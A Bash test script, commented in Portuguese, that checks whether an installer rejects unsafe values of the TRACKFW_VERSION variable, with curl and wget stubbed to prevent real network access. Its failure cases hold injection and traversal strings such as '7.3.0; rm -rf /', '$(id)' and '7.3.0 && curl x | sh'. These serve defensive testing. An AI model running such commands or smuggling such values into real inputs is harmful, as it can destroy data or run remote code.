#!/usr/bin/env bash
# check-install-version-pin.sh — falsifica o suporte de scripts/install.sh a TRACKFW_VERSION
# (REQ-2026-08-28-gate-de-ci-gerado-instala-versao-nao-pinada-do-trackfw-e-nao-ha-como-pinar.md,
# AC1-AC5; roadmap ML-1A). Modelo de ameaça em
# docs/roadmaps/wip/ROADMAP-2026-08-28-gate-de-ci-pinado-na-versao-geradora-e-install-sh-honrando-
# trackfw-version.md, secao "Resultado do ML-0A", secoes 2 e 3.
#
# Vetor central: install.sh valida TRACKFW_VERSION com `case`, nao `grep -E`. `grep -E '^...$'`
# ancora por LINHA, nao pelo buffer inteiro — um valor "v7.3.0\nFOO" casaria a primeira linha
# isolada e o valor completo (com a segunda linha) seguiria para URL/FILENAME sem ser rejeitado.
# `case` ancora nas duas pontas do parametro inteiro por construcao. Ver
# vault/notes/bash-grep-F-embedded-newline-vacuous-match-2026-08-16.md (mesma familia de bug:
# ali era o PADRAO de grep -F com \n embutido; aqui seria o DADO de grep -E com \n embutido —
# mecanismo diferente, mesma causa raiz).
#
# O alvo real de um path traversal nao e a URL remota (o GitHub normaliza o path do lado do
# servidor) — e o argumento `-o` do curl de download, que grava em TMP_DIR/FILENAME. Por isso
# este gate nao le apenas a URL impressa: le tambem o DEST (destino do -o) impresso pelo seam
# TRACKFW_INSTALL_DRYRUN.
#
# Hermeticidade: nenhum cenario aqui dispara rede de verdade. Dois mecanismos independentes:
#   1. TRACKFW_INSTALL_DRYRUN=1 faz install.sh sair com 0 ANTES do curl/wget de download.
#   2. curl/wget sao interceptados por stubs no inicio do PATH — mesmo a chamada de resolucao
#      via API (releases/latest), que roda ANTES do ponto de saida do dryrun quando
#      TRACKFW_VERSION esta ausente/vazia, bate no stub, nao na rede real. O stub tambem serve
#      de prova positiva de AC1 ("pula a API quando pinada"): quando TRACKFW_VERSION é valida,
#      o log de chamadas do stub deve ficar vazio.
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
INSTALL_SH="$ROOT/scripts/install.sh"

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

STUB_BIN="$WORK/stubbin"
mkdir -p "$STUB_BIN"
CURL_LOG="$WORK/curl.log"
export CURL_LOG
: > "$CURL_LOG"

# Stub de curl: registra toda chamada em CURL_LOG. Se a URL for a API de releases/latest,
# responde com um tag_name valido (para o fluxo nao-pinado seguir ate o ponto de saida do
# dryrun). Qualquer outra chamada (download real) indica que o script tentou ultrapassar o
# seam de dryrun — falha ruidosa, nunca rede de verdade.
cat > "$STUB_BIN/curl" <<'EOF'
#!/usr/bin/env bash
echo "curl $*" >> "$CURL_LOG"
for a in "$@"; do
  case "$a" in
    https://api.github.com/*)
      echo '{"tag_name": "v7.3.0"}'
      exit 0
      ;;
  esac
done
echo "STUB curl: chamada inesperada fora da API de releases/latest — o dryrun deveria ter saido antes" >&2
exit 1
EOF
chmod +x "$STUB_BIN/curl"

cat > "$STUB_BIN/wget" <<'EOF'
#!/usr/bin/env bash
echo "wget $*" >> "$CURL_LOG"
echo "STUB wget: chamada inesperada — este gate so exercita o caminho via curl" >&2
exit 1
EOF
chmod +x "$STUB_BIN/wget"

OUT=""
EC=0

# run_install ENVASSIGN...  — roda install.sh com as atribuicoes de env dadas, mais
# TRACKFW_INSTALL_DRYRUN=1 e PATH apontando para os stubs. Preenche OUT/EC.
run_install() {
  : > "$CURL_LOG"
  set +e
  OUT=$(env "$@" TRACKFW_INSTALL_DRYRUN=1 PATH="$STUB_BIN:$PATH" sh "$INSTALL_SH" 2>&1)
  EC=$?
  set -e
}

# run_install_unset — mesma coisa, mas com TRACKFW_VERSION explicitamente ausente do ambiente
# (nao apenas vazia), para cobrir o caso "variavel nunca setada" (AC2) separado do caso
# "variavel setada como string vazia".
run_install_unset() {
  : > "$CURL_LOG"
  set +e
  OUT=$(env -u TRACKFW_VERSION TRACKFW_INSTALL_DRYRUN=1 PATH="$STUB_BIN:$PATH" sh "$INSTALL_SH" 2>&1)
  EC=$?
  set -e
}

SCENARIOS_RUN=0

pass_pinned() {
  # label, TRACKFW_VERSION value, expected version substring in URL (ja normalizada com 'v'),
  # expected VERSION_BARE (sem 'v') para checar o DEST — o alvo real de um path traversal
  # (o argumento `-o` do curl de download, nao a URL remota).
  local label="$1" value="$2" expect="$3" expect_bare="$4"
  run_install "TRACKFW_VERSION=$value"
  if [ "$EC" -ne 0 ]; then
    echo "FAIL [install-version-pin/$label]: esperava exit 0, saiu com $EC" >&2
    echo "  output: $OUT" >&2
    exit 1
  fi
  if ! grep -qF "$expect" <<<"$OUT"; then
    echo "FAIL [install-version-pin/$label]: URL nao contem '$expect'" >&2
    echo "  output: $OUT" >&2
    exit 1
  fi
  local dest
  dest=$(sed -n 's/^DEST: //p' <<<"$OUT")
  if [ -z "$dest" ]; then
    echo "FAIL [install-version-pin/$label]: nenhuma linha DEST impressa pelo seam de dryrun" >&2
    echo "  output: $OUT" >&2
    exit 1
  fi
  # O alvo real do traversal e o `-o` do curl (grava DEST em disco). O basename de DEST tem
  # que ser exatamente "trackfw_<bare>_<os>_<arch>.tar.gz" — sem "/" nem ".." vazando do
  # VERSION_BARE para dentro do nome do arquivo ou para fora de TMP_DIR.
  case "$dest" in
    *..*)
      echo "FAIL [install-version-pin/$label]: DEST contem '..' — path traversal no destino do -o" >&2
      echo "  DEST: $dest" >&2
      exit 1
      ;;
  esac
  local base="${dest##*/}"
  case "$base" in
    trackfw_"${expect_bare}"_*.tar.gz) : ;;
    *)
      echo "FAIL [install-version-pin/$label]: basename de DEST nao bate 'trackfw_${expect_bare}_<os>_<arch>.tar.gz'" >&2
      echo "  DEST: $dest" >&2
      exit 1
      ;;
  esac
  if [ -s "$CURL_LOG" ]; then
    echo "FAIL [install-version-pin/$label]: AC1 violado — houve chamada a curl/wget com TRACKFW_VERSION pinada (deveria pular a API)" >&2
    echo "  curl log: $(cat "$CURL_LOG")" >&2
    exit 1
  fi
  echo "OK   [install-version-pin/$label]"
  SCENARIOS_RUN=$((SCENARIOS_RUN + 1))
}

pass_api_resolved() {
  # label, funcao de invocacao (run_install_unset ou run_install com valor vazio)
  local label="$1"
  if [ "$EC" -ne 0 ]; then
    echo "FAIL [install-version-pin/$label]: esperava exit 0 (fluxo AC2 intocado), saiu com $EC" >&2
    echo "  output: $OUT" >&2
    exit 1
  fi
  if ! grep -qF "api.github.com" "$CURL_LOG"; then
    echo "FAIL [install-version-pin/$label]: AC2 violado — TRACKFW_VERSION ausente/vazia deveria consultar a API de releases/latest e nao consultou" >&2
    echo "  curl log: $(cat "$CURL_LOG")" >&2
    exit 1
  fi
  echo "OK   [install-version-pin/$label]"
  SCENARIOS_RUN=$((SCENARIOS_RUN + 1))
}

assert_fails_with() {
  local label="$1" pattern="$2" value="$3"
  run_install "TRACKFW_VERSION=$value"
  if [ "$EC" -eq 0 ]; then
    echo "FAIL [install-version-pin/$label]: saiu com 0, esperava != 0 para TRACKFW_VERSION='$value'" >&2
    echo "  output: $OUT" >&2
    exit 1
  fi
  if ! grep -qF "$pattern" <<<"$OUT"; then
    echo "FAIL [install-version-pin/$label]: saiu com $EC mas falta diagnostico '$pattern'" >&2
    echo "  output: $OUT" >&2
    exit 1
  fi
  if [ -s "$CURL_LOG" ]; then
    echo "FAIL [install-version-pin/$label]: valor invalido nao deveria ter composto URL nem chamado curl/wget" >&2
    echo "  curl log: $(cat "$CURL_LOG")" >&2
    exit 1
  fi
  if grep -qF "DEST: " <<<"$OUT"; then
    echo "FAIL [install-version-pin/$label]: valor invalido chegou a compor o alvo do -o (DEST impresso) — a rejeicao tem que ocorrer ANTES da composicao de URL/FILENAME/DEST" >&2
    echo "  output: $OUT" >&2
    exit 1
  fi
  echo "OK   [install-version-pin/$label]"
  SCENARIOS_RUN=$((SCENARIOS_RUN + 1))
}

REASON="TRACKFW_VERSION invalida"

# --- Cenarios que PASSAM ---------------------------------------------------

pass_pinned "pinned-bare"              "7.3.0"    "v7.3.0"    "7.3.0"
pass_pinned "pinned-v-prefixed"        "v7.3.0"   "v7.3.0"    "7.3.0"
pass_pinned "pinned-multi-digit-minor" "v7.30.0"  "v7.30.0"   "7.30.0"
pass_pinned "pinned-multi-digit-major" "v10.0.0"  "v10.0.0"   "10.0.0"
pass_pinned "pinned-pre-1.0-no-v"      "0.9.1"    "v0.9.1"    "0.9.1"

# AC5: "7.3.0" e "v7.3.0" tem que baixar o mesmo asset — URL E DEST byte-identicos. O DEST e
# o alvo real do -o do curl (o argumento de escrita em disco), nao so a URL remota.
run_install "TRACKFW_VERSION=7.3.0"
URL_BARE=$(grep '^URL: ' <<<"$OUT")
DEST_BARE=$(sed -n 's/^DEST: //p' <<<"$OUT")
run_install "TRACKFW_VERSION=v7.3.0"
URL_PREFIXED=$(grep '^URL: ' <<<"$OUT")
DEST_PREFIXED=$(sed -n 's/^DEST: //p' <<<"$OUT")
if [ "$URL_BARE" != "$URL_PREFIXED" ]; then
  echo "FAIL [install-version-pin/ac5-same-asset]: AC5 violado — '7.3.0' e 'v7.3.0' compuseram URLs diferentes" >&2
  echo "  bare:      $URL_BARE" >&2
  echo "  prefixed:  $URL_PREFIXED" >&2
  exit 1
fi
if [ "${DEST_BARE##*/}" != "${DEST_PREFIXED##*/}" ]; then
  echo "FAIL [install-version-pin/ac5-same-asset]: AC5 violado — '7.3.0' e 'v7.3.0' compuseram basenames de DEST diferentes" >&2
  echo "  bare:      $DEST_BARE" >&2
  echo "  prefixed:  $DEST_PREFIXED" >&2
  exit 1
fi
echo "OK   [install-version-pin/ac5-same-asset]"
SCENARIOS_RUN=$((SCENARIOS_RUN + 1))

run_install_unset
pass_api_resolved "unset-resolves-via-api"

run_install "TRACKFW_VERSION="
pass_api_resolved "empty-resolves-via-api"

# --- Cenarios que FALHAM, com a razao declarada pelo proprio install.sh ----

assert_fails_with "command-separator-semicolon" "$REASON" '7.3.0; rm -rf /'
assert_fails_with "command-substitution-dollar" "$REASON" '$(id)'
assert_fails_with "command-substitution-backtick" "$REASON" '`id`'
assert_fails_with "command-separator-and-pipe"  "$REASON" '7.3.0 && curl x | sh'
assert_fails_with "path-traversal"              "$REASON" '../../etc'
# Traversal com prefixo numerico valido — o alvo real deste vetor nao e a URL remota (o
# GitHub normaliza o path do lado do servidor), e sim o argumento `-o` do curl de download:
# se VERSION_BARE contivesse "/", FILENAME/DEST escreveria fora de TMP_DIR. O charset de
# `case` (so digitos e ponto apos o "v" opcional) ja rejeita "/" antes de compor DEST — este
# cenario nomeia explicitamente esse alvo, em vez de so testar a forma generica "../../etc".
assert_fails_with "path-traversal-targets-dash-o-dest" "$REASON" '7.3.0/../../tmp/evil'
assert_fails_with "whitespace-only"             "$REASON" '   '

# Newline embutida COM conteudo depois dela — o vetor central deste ML (secao 2 do ML-0A).
# Um cenario so com "v7.3.0\n" (newline final sem conteudo) nao discrimina uma implementacao
# correta de uma baseada em `grep -qE` sem `-z`: ambas passariam. O conteudo pos-newline e o
# que expoe o bug de ancoragem por-linha do grep.
NEWLINE_VALUE=$(printf 'v7.3.0\nFOO')
assert_fails_with "embedded-newline-with-trailing-content" "$REASON" "$NEWLINE_VALUE"

# --- Guarda de vacuidade ----------------------------------------------------
if [ "$SCENARIOS_RUN" -eq 0 ]; then
  echo "FAIL [install-version-pin]: guarda de vacuidade — nenhum cenario rodou" >&2
  exit 1
fi

echo "install-version-pin: $SCENARIOS_RUN cenarios OK"
